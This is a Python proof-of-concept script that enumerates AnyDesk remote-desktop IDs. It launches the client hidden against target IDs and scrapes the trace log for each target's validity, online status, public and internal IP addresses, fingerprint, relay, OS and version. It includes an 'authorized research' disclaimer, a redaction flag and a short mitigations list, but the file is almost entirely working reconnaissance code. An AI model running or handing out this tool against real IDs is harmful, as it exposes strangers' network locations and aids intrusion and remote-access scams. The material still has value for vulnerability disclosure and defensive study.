"""
AnyDesk ID Enumeration PoC (Linux / Windows)

Demonstrates that AnyDesk's 9-10 digit numeric IDs can be enumerated.
For each probed ID, the relay leaks:
  - Whether the ID is VALID or INVALID
  - Whether the target is ONLINE or OFFLINE
  - The target's public IP address and port (if online)
  - The target's cryptographic fingerprint (FPR)
  - Which relay server the target is connected to
  - The target's internal network IPs (direct connection candidates)

Modes:
  info      - Show local AnyDesk config and connection history
  probe     - Headless enumeration (trace parsing)

For authorized security research and threat hunting only.

Usage:
    python anydesk_id_enum.py info
    python anydesk_id_enum.py probe --ids TARGET_ID 123456789
    python anydesk_id_enum.py probe --ids TARGET_ID --wait 8 -o results.json
"""

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

IS_LINUX = sys.platform.startswith("linux")
IS_WINDOWS = sys.platform == "win32"

if IS_WINDOWS:
    import ctypes

ANYDESK_CONFIG_PATHS_LINUX = [
    Path("/etc/anydesk"),
    Path.home() / ".anydesk",
]

ANYDESK_CONFIG_PATHS_WINDOWS = [
    Path(os.environ.get("APPDATA", "")) / "AnyDesk",
    Path(os.environ.get("PROGRAMDATA", "")) / "AnyDesk",
]

ANYDESK_CONFIG_PATHS = (
    ANYDESK_CONFIG_PATHS_LINUX if IS_LINUX else ANYDESK_CONFIG_PATHS_WINDOWS
)

ANYDESK_TRACE_PATHS_LINUX = [
    Path("/var/log/anydesk.trace"),
    Path.home() / ".anydesk" / "ad.trace",
]

ANYDESK_EXE_PATHS_LINUX = [
    Path("/usr/bin/anydesk"),
    Path("/usr/local/bin/anydesk"),
    Path("/snap/bin/anydesk"),
]

ANYDESK_EXE_PATHS_WINDOWS = [
    Path(os.environ.get("USERPROFILE", "")) / "Downloads" / "AnyDesk.exe",
    Path(os.environ.get("PROGRAMFILES", "")) / "AnyDesk" / "AnyDesk.exe",
    Path(os.environ.get("PROGRAMFILES(X86)", "")) / "AnyDesk" / "AnyDesk.exe",
    Path(os.environ.get("LOCALAPPDATA", "")) / "Programs" / "AnyDesk" / "AnyDesk.exe",
]


def find_anydesk_exe():
    paths = ANYDESK_EXE_PATHS_LINUX if IS_LINUX else ANYDESK_EXE_PATHS_WINDOWS
    for p in paths:
        if p.exists():
            return str(p)
    found = shutil.which("anydesk")
    if found:
        return found
    return None


def find_trace_file():
    if IS_LINUX:
        for p in ANYDESK_TRACE_PATHS_LINUX:
            if p.exists():
                return p
    config_dir = find_config_dir()
    if config_dir:
        t = config_dir / "ad.trace"
        if t.exists():
            return t
    return None


def detect_display():
    if not IS_LINUX:
        return None
    if os.environ.get("DISPLAY"):
        return os.environ["DISPLAY"]
    if os.environ.get("WAYLAND_DISPLAY"):
        return None
    for x in sorted(Path("/tmp/.X11-unix").glob("X*")):
        return ":" + x.name[1:]
    return None


def find_config_dir():
    for p in ANYDESK_CONFIG_PATHS:
        if (p / "service.conf").exists() or (p / "system.conf").exists():
            return p
    return None


def parse_config(config_dir):
    info = {
        "config_dir": str(config_dir),
        "local_id": None,
        "last_relay": None,
        "fingerprint": None,
        "network_id": None,
        "has_cert": False,
        "has_key": False,
    }
    system_conf = config_dir / "system.conf"
    if system_conf.exists():
        content = system_conf.read_text(errors="replace")
        for line in content.splitlines():
            if line.startswith("ad.anynet.id="):
                info["local_id"] = line.split("=", 1)[1].strip()
            elif line.startswith("ad.anynet.last_relay="):
                info["last_relay"] = line.split("=", 1)[1].strip()
            elif line.startswith("ad.anynet.fpr="):
                info["fingerprint"] = line.split("=", 1)[1].strip()
            elif line.startswith("ad.anynet.network_id="):
                info["network_id"] = line.split("=", 1)[1].strip()

    service_conf = config_dir / "service.conf"
    if service_conf.exists():
        content = service_conf.read_text(errors="replace")
        info["has_cert"] = "BEGIN CERTIFICATE" in content
        info["has_key"] = "BEGIN PRIVATE KEY" in content
    return info


def parse_connection_trace(config_dir):
    trace_file = config_dir / "connection_trace.txt"
    if not trace_file.exists():
        return []
    raw = trace_file.read_bytes()
    if b"\x00" in raw[:20]:
        text = raw.decode("utf-16", errors="replace")
    else:
        text = raw.decode("utf-8", errors="replace")

    entries = []
    for line in text.splitlines():
        clean = line.replace("\x00", "").strip()
        if not clean:
            continue
        parts = clean.split()
        if len(parts) >= 5 and parts[0] in ("Outgoing", "Incoming"):
            entries.append({
                "direction": parts[0],
                "date": parts[1],
                "time": parts[2],
                "auth": parts[3],
                "id": parts[4],
            })
    return entries


def get_trace_size():
    trace = find_trace_file()
    if not trace:
        return 0
    return trace.stat().st_size


def read_trace_from(offset):
    trace = find_trace_file()
    if not trace:
        return ""
    current_size = trace.stat().st_size
    if current_size < offset:
        safe_offset = max(0, current_size - 100000)
    else:
        safe_offset = max(0, offset - 20000)
    with open(trace, "r", errors="replace") as f:
        f.seek(safe_offset)
        return f.read()


def parse_probe_result(trace_text, target_id):
    result = {
        "target_id": str(target_id),
        "valid": None,
        "online": None,
        "client_id": None,
        "fingerprint": None,
        "fingerprint_full": None,
        "source_ip": None,
        "relay_id": None,
        "remote_os": None,
        "remote_version": None,
        "remote_internal_ips": [],
        "direct_candidates": [],
        "status_text": None,
    }
    tid = str(target_id)
    all_lines = trace_text.splitlines()

    in_context = False
    context_start = 0
    for i, line in enumerate(all_lines):
        if tid in line:


            m = re.search(r"Client-ID:\s*(\d+)\s*\(FPR:\s*([a-f0-9]+)\)", line)
            if m and m.group(1) == tid:
                result["valid"] = True
                result["client_id"] = m.group(1)
                result["fingerprint"] = m.group(2)
                in_context = True
                context_start = i

            if "Client appears to be offline" in line:
                result["online"] = False

            if "This desk is not available" in line:
                if result["valid"] is None:
                    result["valid"] = True
                result["status_text"] = "not_available"

            if "anynet_not_found" in line:
                result["status_text"] = "not_found"

            if "anynet_invalid_cid" in line:
                result["valid"] = False
                result["status_text"] = "invalid_cid"

            if "address you have entered is invalid" in line:
                result["valid"] = False
                result["status_text"] = "invalid_address"

        elif in_context:
            if (i - context_start) > 15:
                in_context = False
                continue
            if re.search(r"Client-ID:\s*\d+", line):
                in_context = False
                continue

            m = re.search(r"Logged in from\s+(\S+)\s+on relay\s+(\S+)", line)
            if m:
                result["online"] = True
                result["source_ip"] = m.group(1)
                result["relay_id"] = m.group(2).rstrip(".")
    
                continue

            m = re.search(r"Remote OS:\s*(\S+)", line)
            if m:
                result["remote_os"] = m.group(1)
    
                continue

            m = re.search(r"Remote version:\s*(\S+)", line)
            if m:
                result["remote_version"] = m.group(1)
    
                continue

    # Second pass: extract additional data written after Client-ID line
    if result["client_id"]:
        last_cid_line = max(
            (i for i, l in enumerate(all_lines) if f"Client-ID: {tid}" in l),
            default=-1,
        )
        if last_cid_line >= 0:
            for j in range(last_cid_line + 1, min(len(all_lines), last_cid_line + 150)):
                line = all_lines[j]

                if not result["remote_os"]:
                    m = re.search(r"Remote OS:\s*(\S+)", line)
                    if m:
                        result["remote_os"] = m.group(1)
            

                if not result["remote_version"]:
                    m = re.search(r"Remote version:\s*(\S+)", line)
                    if m:
                        result["remote_version"] = m.group(1)
            

                m = re.search(r"Making a new connection to client\s+([a-f0-9]+)", line)
                if m and not result["fingerprint_full"]:
                    result["fingerprint_full"] = m.group(1)

                m = re.search(r"Candidate\s+\d+\s+\[([^\]]+)\]", line)
                if m:
                    candidate = m.group(1)
                    if candidate not in result["direct_candidates"]:
                        result["direct_candidates"].append(candidate)

                m = re.search(r"Spawning:?\s+(\d+\.\d+\.\d+\.\d+:\d+)", line)
                if m:
                    addr = m.group(1)
                    ip = addr.split(":")[0]
                    if ip not in result["remote_internal_ips"]:
                        result["remote_internal_ips"].append(ip)

    if result["fingerprint"]:
        result["valid"] = True
        if result["online"] is None:
            result["online"] = False

    return result


def redact_ip(ip):
    if not ip:
        return ip
    parts = ip.split(":")
    octets = parts[0].split(".")
    if len(octets) == 4:
        masked = f"{octets[0]}.{octets[1]}.xxx.xxx"
        if len(parts) > 1:
            return f"{masked}:{parts[1]}"
        return masked
    return ip


def redact_id(aid):
    if not aid or len(aid) < 6:
        return aid
    return aid[:3] + "*" * (len(aid) - 5) + aid[-2:]


def redact_fpr(fpr):
    if not fpr:
        return fpr
    return fpr[:4] + "..." + fpr[-4:]


SW_HIDE = 0
STARTF_USESHOWWINDOW = 0x00000001
CREATE_NO_WINDOW = 0x08000000


def launch_probe(exe, target_id, wait_seconds=8):
    env = os.environ.copy()

    if IS_LINUX:
        display = detect_display()
        if not display:
            print("[!] No X display found. Set DISPLAY manually.")
            sys.exit(1)
        env["DISPLAY"] = display

    if IS_WINDOWS:
        si = subprocess.STARTUPINFO()
        si.dwFlags = STARTF_USESHOWWINDOW
        si.wShowWindow = SW_HIDE
        proc = subprocess.Popen(
            [exe, str(target_id)],
            startupinfo=si,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
        )
    else:
        proc = subprocess.Popen(
            [exe, str(target_id)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            env=env,
        )

    time.sleep(wait_seconds)

    proc.terminate()
    try:
        proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=2)


def get_cli_info(exe):
    """Use AnyDesk CLI to get live info (works best on Linux)."""
    cli_info = {}
    for flag, key in [("--get-id", "cli_id"), ("--get-status", "cli_status"),
                      ("--version", "cli_version"), ("--get-alias", "cli_alias")]:
        try:
            out = subprocess.check_output(
                [exe, flag], stderr=subprocess.DEVNULL, timeout=5
            ).decode().strip()
            cli_info[key] = out
        except Exception:
            cli_info[key] = None
    return cli_info


def cmd_info(args):
    print("=" * 70)
    print("AnyDesk Local Configuration")
    print("=" * 70)

    exe = find_anydesk_exe()
    print(f"\nPlatform:    {'Linux' if IS_LINUX else 'Windows'}")
    print(f"Executable:  {exe or 'NOT FOUND'}")

    rd = args.redact
    if exe:
        cli = get_cli_info(exe)
        cli_id = redact_id(cli.get('cli_id')) if rd else cli.get('cli_id', 'n/a')
        print(f"CLI ID:      {cli_id}")
        print(f"CLI Status:  {cli.get('cli_status', 'n/a')}")
        print(f"CLI Version: {cli.get('cli_version', 'n/a')}")
        print(f"CLI Alias:   {cli.get('cli_alias', 'n/a')}")

    trace_file = find_trace_file()
    print(f"Trace file:  {trace_file or 'NOT FOUND'}")

    if IS_LINUX:
        display = detect_display()
        print(f"X Display:   {display or 'NOT FOUND (probes will fail)'}")

    config_dir = find_config_dir()
    if not config_dir:
        print("Config directory: NOT FOUND")
        return

    info = parse_config(config_dir)
    print(f"Config dir:  {info['config_dir']}")
    print(f"Config ID:   {redact_id(info['local_id']) if rd else info['local_id']}")
    print(f"Fingerprint: {redact_fpr(info['fingerprint']) if rd else info['fingerprint']}")
    print(f"Network:     {info['network_id']}")
    print(f"Last relay:  {info['last_relay']}")
    print(f"Client cert: {'YES' if info['has_cert'] else 'NO'}")
    print(f"Private key: {'YES' if info['has_key'] else 'NO'}")

    print(f"\n{'=' * 70}")
    print("Connection History")
    print("=" * 70)

    entries = parse_connection_trace(config_dir)
    unique_ids = set()
    for e in entries:
        unique_ids.add(e["id"])
        eid = redact_id(e["id"]) if rd else e["id"]
        print(f"  {e['direction']:8s}  {e['date']} {e['time']}  "
              f"auth={e['auth']:10s}  ID={eid}")

    if rd:
        print(f"\nUnique remote IDs: {sorted(redact_id(i) for i in unique_ids)}")
    else:
        print(f"\nUnique remote IDs: {sorted(unique_ids)}")

    if args.output:
        with open(args.output, "w") as f:
            json.dump({"config": info, "history": entries,
                       "cli": cli if exe else {}}, f, indent=2)
        print(f"\nSaved to {args.output}")


def cmd_probe(args):
    print("=" * 70)
    print("AnyDesk ID Enumeration PoC — Probe")
    print("=" * 70)

    exe = find_anydesk_exe()
    if not exe:
        print("[!] AnyDesk executable not found.")
        sys.exit(1)

    config_dir = find_config_dir()
    if not config_dir:
        print("[!] AnyDesk config not found.")
        sys.exit(1)

    trace_file = find_trace_file()
    if not trace_file:
        print("[!] AnyDesk trace file not found.")
        sys.exit(1)

    info = parse_config(config_dir)
    cli = get_cli_info(exe)
    local_id = cli.get("cli_id") or info["local_id"]

    rd = args.redact
    print(f"\nPlatform:   {'Linux' if IS_LINUX else 'Windows'}")
    print(f"Local ID:   {redact_id(local_id) if rd else local_id}")
    print(f"Status:     {cli.get('cli_status', 'unknown')}")
    print(f"Trace log:  {trace_file}")

    if IS_LINUX:
        display = detect_display()
        print(f"X Display:  {display or 'NOT FOUND'}")
        if not display:
            print("[!] No X display — probes require a display on Linux.")
            sys.exit(1)

    target_ids = args.ids
    if not target_ids:
        print("[!] No target IDs. Use --ids")
        return

    wait = args.wait
    results = []

    print(f"\nProbing {len(target_ids)} IDs (wait={wait}s per probe)...\n")
    print(f"{'ID':>12s}  {'Valid':>5s}  {'Online':>6s}  {'Fingerprint':>14s}  "
          f"{'Source IP':>22s}  {'Relay':>10s}  {'OS':>8s}  {'Version':>8s}")
    print(f"{'-' * 12}  {'-' * 5}  {'-' * 6}  {'-' * 14}  {'-' * 22}  "
          f"{'-' * 10}  {'-' * 8}  {'-' * 8}")

    for tid in target_ids:
        offset = get_trace_size()
        launch_probe(exe, tid, wait_seconds=wait)
        time.sleep(0.5)
        new_trace = read_trace_from(offset)
        r = parse_probe_result(new_trace, tid)
        results.append(r)

        valid = "YES" if r["valid"] else ("NO" if r["valid"] is False else "?")
        online = "YES" if r["online"] else ("NO" if r["online"] is False else "?")
        fpr = redact_fpr(r["fingerprint"]) if rd and r["fingerprint"] else (r["fingerprint"] or "-")
        src_ip = redact_ip(r["source_ip"]) if rd and r["source_ip"] else (r["source_ip"] or "-")
        relay = r["relay_id"] or "-"
        ros = r["remote_os"] or "-"
        rver = r["remote_version"] or "-"
        dtid = redact_id(tid) if rd else tid

        print(f"{dtid:>12s}  {valid:>5s}  {online:>6s}  {fpr:>14s}  "
              f"{src_ip:>22s}  {relay:>10s}  {ros:>8s}  {rver:>8s}")

        if r["remote_internal_ips"]:
            ips = [redact_ip(ip) for ip in r["remote_internal_ips"]] if rd else r["remote_internal_ips"]
            print(f"{'':>12s}  Remote internal IPs: {', '.join(ips)}")
        if r["direct_candidates"]:
            cands = [redact_ip(c) for c in r["direct_candidates"]] if rd else r["direct_candidates"]
            print(f"{'':>12s}  Direct candidates:   {', '.join(cands)}")

        if tid != target_ids[-1]:
            time.sleep(1)

    # Summary
    print(f"\n{'=' * 70}")
    print("ENUMERATION RESULTS")
    print("=" * 70)

    valid_ids = [r for r in results if r["valid"]]
    invalid_ids = [r for r in results if r["valid"] is False]
    online_ids = [r for r in results if r["online"]]
    with_ip = [r for r in results if r["source_ip"]]
    with_internal = [r for r in results if r["remote_internal_ips"]]
    unknown = [r for r in results if r["valid"] is None]

    print(f"\n  Total probed:    {len(results)}")
    print(f"  Valid IDs:       {len(valid_ids)}")
    print(f"  Invalid IDs:     {len(invalid_ids)}")
    print(f"  Online:          {len(online_ids)}")
    print(f"  IP leaked:       {len(with_ip)}")
    print(f"  Internal IPs:    {len(with_internal)}")

    if valid_ids:
        print(f"\n  --- Valid IDs ---")
        for r in valid_ids:
            status = "ONLINE" if r["online"] else "OFFLINE"
            rid = redact_id(r['target_id']) if rd else r['target_id']
            rfpr = redact_fpr(r['fingerprint']) if rd else r['fingerprint']
            rip = redact_ip(r['source_ip']) if rd and r['source_ip'] else (r['source_ip'] or 'n/a')
            print(f"    {rid:>12s}  [{status:>7s}]  "
                  f"FPR={rfpr}  IP={rip}  "
                  f"Relay={r['relay_id'] or 'n/a'}")
            if r["fingerprint_full"]:
                ffpr = redact_fpr(r['fingerprint_full']) if rd else r['fingerprint_full']
                print(f"    {'':>12s}  Full FPR: {ffpr}")
            if r["remote_internal_ips"]:
                ips = [redact_ip(ip) for ip in r['remote_internal_ips']] if rd else r['remote_internal_ips']
                print(f"    {'':>12s}  Internal: {', '.join(ips)}")

    if invalid_ids:
        print(f"\n  --- Invalid IDs ---")
        for r in invalid_ids:
            rid = redact_id(r['target_id']) if rd else r['target_id']
            print(f"    {rid:>12s}  ({r.get('status_text', 'invalid')})")

    if unknown:
        print(f"\n  --- Unknown ---")
        for r in unknown:
            rid = redact_id(r['target_id']) if rd else r['target_id']
            print(f"    {rid:>12s}  (try --wait {wait + 3})")

    if valid_ids or invalid_ids:
        has_oracle = bool(valid_ids) and bool(invalid_ids)
        if has_oracle:
            print(f"\n  [!] ENUMERATION ORACLE CONFIRMED")
            print(f"      Valid IDs return: Client-ID + FPR + online/offline + IP")
            print(f"      Invalid IDs return: anynet_invalid_cid (instant reject)")
        elif valid_ids:
            print(f"\n  [!] ENUMERATION CONFIRMED — all probed IDs were valid")
            print(f"      Relay disclosed fingerprints and status for each")

        print(f"\n      Leaked per valid ID:")
        print(f"        - Existence (valid vs invalid)")
        print(f"        - Online/offline status")
        print(f"        - Cryptographic fingerprint (short + full)")
        print(f"        - Public IP + port (when online)")
        print(f"        - Relay server assignment")
        print(f"        - Internal/private IPs (direct connection candidates)")
        print(f"\n      Mitigations:")
        print(f"        - AnyDesk ACL / whitelist")
        print(f"        - Enterprise namespace (custom IDs)")
        print(f"        - Strong unattended access passwords")
        print(f"        - Firewall block on AnyDesk relay IPs")
        print(f"        - Monitor ad.trace for recon attempts")

    if args.output:
        output = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "platform": "linux" if IS_LINUX else "windows",
            "local_id": local_id,
            "total_probed": len(results),
            "valid_count": len(valid_ids),
            "invalid_count": len(invalid_ids),
            "online_count": len(online_ids),
            "ip_leaked_count": len(with_ip),
            "internal_ip_leaked_count": len(with_internal),
            "results": results,
        }
        with open(args.output, "w") as f:
            json.dump(output, f, indent=2, default=str)
        print(f"\n[*] Saved to {args.output}")


def main():
    parser = argparse.ArgumentParser(description="AnyDesk ID Enumeration PoC")
    sub = parser.add_subparsers(dest="command")

    p_info = sub.add_parser("info", help="Show local config and history")
    p_info.add_argument("-o", "--output")
    p_info.add_argument("--redact", action="store_true",
                        help="Mask IPs and IDs in output")

    p_probe = sub.add_parser("probe", help="Headless ID enumeration")
    p_probe.add_argument("--ids", nargs="+", required=True)
    p_probe.add_argument("--wait", type=int, default=8,
                         help="Seconds per probe (default: 8)")
    p_probe.add_argument("-o", "--output")
    p_probe.add_argument("--redact", action="store_true",
                         help="Mask IPs and IDs in output")

    args = parser.parse_args()

    if args.command == "info":
        cmd_info(args)
    elif args.command == "probe":
        cmd_probe(args)
    else:
        parser.print_help()
        print("\nExamples:")
        print("  python anydesk_id_enum.py info")
        print("  python anydesk_id_enum.py probe --ids TARGET_ID 123456789")
        print("  python anydesk_id_enum.py probe --ids TARGET_ID --wait 10 -o results.json")


if __name__ == "__main__":
    main()
